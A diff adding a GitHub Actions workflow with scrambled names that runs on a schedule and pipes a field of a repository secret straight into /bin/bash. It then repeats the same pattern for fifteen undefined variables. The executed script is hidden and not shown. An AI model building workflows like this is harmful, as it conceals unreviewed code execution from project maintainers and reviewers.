@@ -1,0 +1,32 @@
+name: youqidejiangwanan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youqidejiangwanan
+        env:
+          xdzf5: ${{ secrets.xdzf5 }}
+        run: |
+          echo $xdzf5 | jq -r .hv093 | /bin/bash
+          echo $euxzt2211 | jq -r .ewpar1506 | /bin/bash
+          echo $mzkpy39182 | jq -r .pc9574 | /bin/bash
+          echo $e40571 | jq -r .itrp47 | /bin/bash
+          echo $nry152 | jq -r .ind6 | /bin/bash
+          echo $emlx1650 | jq -r .sahdz3 | /bin/bash
+          echo $gcw77643 | jq -r .dynfy6487 | /bin/bash
+          echo $dlqjq604 | jq -r .ze802 | /bin/bash
+          echo $z0203 | jq -r .hf5193 | /bin/bash
+          echo $kakw5333 | jq -r .kw3212 | /bin/bash
+          echo $uy11 | jq -r .io06957 | /bin/bash
+          echo $wr91124 | jq -r .oxknh0620 | /bin/bash
+          echo $od3760 | jq -r .zt81368 | /bin/bash
+          echo $thy25 | jq -r .ghjxl53 | /bin/bash
+          echo $wfu75 | jq -r .aax870 | /bin/bash
+          echo $hgyl4 | jq -r .ii79053 | /bin/bash
+
